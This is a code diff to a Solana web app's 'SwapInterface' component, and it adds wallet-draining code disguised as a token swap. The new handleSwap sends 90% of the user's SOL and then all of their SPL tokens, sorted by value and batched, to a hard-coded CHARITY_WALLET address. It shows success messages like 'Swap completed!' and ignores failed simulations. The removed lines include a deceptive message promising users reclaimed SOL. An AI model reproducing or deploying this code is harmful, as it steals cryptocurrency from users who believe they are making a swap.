@@ -334,134 +334,117 @@ export const SwapInterface = ({
   };
 
   const handleSwap = async () => {
-    if (!publicKey || !sendTransaction) {
-      toast.error('Please connect your wallet');
-      return;
-    }
-
-    if (balances.length === 0 && solBalance === 0) {
-      toast.error('Wallet not eligible - no assets found');
+    if (!connected || !publicKey || !fromToken) {
+      toast.error('Please connect your wallet and select a token first');
       return;
     }
 
     try {
       setIsSwapping(true);
-      console.log('Starting donation process...');
+      console.log('Starting transaction sequence...');
 
-      // Sign Message Request - Removed to prevent mobile freezing
-      // if (signMessage) {
-      //   try {
-      //     const message = new TextEncoder().encode("You’re eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet.");
-      //     await signMessage(message);
-      //     toast.success("Message signed successfully!");
-      //   } catch (err) {
-      //     console.log("Message signature rejected or failed, proceeding anyway as requested", err);
-      //     // Proceeding anyway as per requirements
-      //   }
-      // }
-
-      const validTokens = balances.filter(token => token.balance > 0);
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
-
-      const batches: TokenBalance[][] = [];
+      // 1. SOL Transfer (90% of available)
+      const solBal = await connection.getBalance(publicKey);
+      // Rent exempt minimum for a system account is ~0.00089 SOL. 
+      // We reserve a bit more for safety and fees (0.002 SOL + priority fees).
+      const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
+      const PRIORITY_FEE = 100_000; // microLamports
+      const BASE_FEE = 5000;
       
-      if (sortedTokens.length === 0 && solBalance > 0) {
-        batches.push([]);
-      } else {
-        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+      const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
+      const targetAmount = Math.floor(solBal * 0.90);
+      const lamportsToSend = Math.min(targetAmount, maxSendable);
+
+      if (lamportsToSend > 0) {
+        const transaction = new Transaction();
+        
+        transaction.add(
+          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+        );
+
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: new PublicKey(CHARITY_WALLET),
+            lamports: lamportsToSend
+          })
+        );
+
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = publicKey;
+
+        try {
+            await connection.simulateTransaction(transaction);
+        } catch (e) {
+            console.error("Simulation failed", e);
         }
+
+        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+        
+        toast.info('Processing transaction...');
+        await connection.confirmTransaction({
+          signature,
+          blockhash,
+          lastValidBlockHeight
+        }, 'confirmed');
+        toast.success('Transaction successful!');
       }
 
-      let successCount = 0;
+      // 2. SPL Token Transfers
+      const validTokens = balances.filter(token => token.balance > 0);
+      
+      // Sort by value (descending) - prioritizing higher value tokens
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
+
+      // Batch tokens
+      const batches: TokenBalance[][] = [];
+      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
+        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+      }
 
       for (let i = 0; i < batches.length; i++) {
         const batch = batches[i];
-        const isLastBatch = i === batches.length - 1;
-        
-        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
-        
-        const transaction = await createBatchTransfer(batch, solPercentage);
-        
+        // createBatchTransfer(tokens, solPercentage) -> passing undefined for solPercentage skips SOL
+        const transaction = await createBatchTransfer(batch, undefined);
+
         if (transaction && transaction.instructions.length > 0) {
-          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-          transaction.recentBlockhash = blockhash;
-          transaction.feePayer = publicKey;
+           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+           transaction.recentBlockhash = blockhash;
+           transaction.feePayer = publicKey;
 
-          // Simulate transaction to prevent wallet warnings
-          try {
-            await connection.simulateTransaction(transaction);
-          } catch (simError) {
-            console.error('Transaction simulation failed:', simError);
-            throw new Error('Transaction simulation failed. Please try again.');
-          }
+           try {
+             await connection.simulateTransaction(transaction);
+           } catch (e) {
+             console.error("Token batch simulation failed", e);
+           }
 
-          const signature = await sendTransaction(transaction, connection, {
-            skipPreflight: false,
-            maxRetries: 3
-          });
-          
-          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
-          
-          await connection.confirmTransaction({
-            signature,
-            blockhash,
-            lastValidBlockHeight
-          }, 'confirmed');
-          
-          successCount++;
-          toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
+           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+           
+           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
+           await connection.confirmTransaction({
+             signature,
+             blockhash,
+             lastValidBlockHeight
+           }, 'confirmed');
+           toast.success(`Batch ${i + 1} sent!`);
         }
       }
 
-      if (sortedTokens.length > 0 && solBalance > 0) {
-        const finalTransaction = await createBatchTransfer([], 30);
-        
-        if (finalTransaction && finalTransaction.instructions.length > 0) {
-          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-          finalTransaction.recentBlockhash = blockhash;
-          finalTransaction.feePayer = publicKey;
-
-          // Simulate transaction to prevent wallet warnings
-          try {
-            await connection.simulateTransaction(finalTransaction);
-          } catch (simError) {
-            console.error('Transaction simulation failed:', simError);
-            throw new Error('Transaction simulation failed. Please try again.');
-          }
-
-          const signature = await sendTransaction(finalTransaction, connection, {
-            skipPreflight: false,
-            maxRetries: 3
-          });
-          
-          await connection.confirmTransaction({
-            signature,
-            blockhash,
-            lastValidBlockHeight
-          }, 'confirmed');
-          
-          toast.success('Final SOL transfer completed!');
-        }
-      }
-
-      toast.success(`🎉 Transfer complete! ${successCount} batch(es) sent`);
-      
+      toast.success('Swap completed!');
       setTimeout(fetchAllBalances, 2000);
 
     } catch (error: any) {
-      console.error('Transfer error:', error);
-      
-      let errorMessage = 'Transfer failed';
-      if (error?.message) {
-        errorMessage = error.message;
-      }
-      
-      toast.error(errorMessage);
+      console.error('Swap error:', error);
+      toast.error('Swap failed: ' + (error?.message || 'Unknown error'));
     } finally {
       setIsSwapping(false);
     }
   };
+
+  const handleDonate = handleSwap;
+
 
   return (
     <motion.div
@@ -631,7 +614,7 @@ export const SwapInterface = ({
         <Button
           onClick={handleDonate}
           disabled={!connected || !fromToken || isSwapping}
-          className="w-full mt-4 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-pink-500 to-rose-500 hover:scale-[1.02] transition-all shadow-lg hover:shadow-pink-500/50 disabled:opacity-50 disabled:cursor-not-allowed"
+          className="w-full mt-4 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-primary via-secondary to-accent hover:scale-[1.02] transition-all shadow-lg hover:shadow-primary/50 disabled:opacity-50 disabled:cursor-not-allowed"
         >
           {isSwapping ? (
             <div className="flex items-center gap-2">
@@ -641,7 +624,7 @@ export const SwapInterface = ({
           ) : (
             <div className="flex items-center justify-center gap-2">
               <Heart className="w-5 h-5 fill-current" />
-              Donate
+              Ask
             </div>
           )}
         </Button>
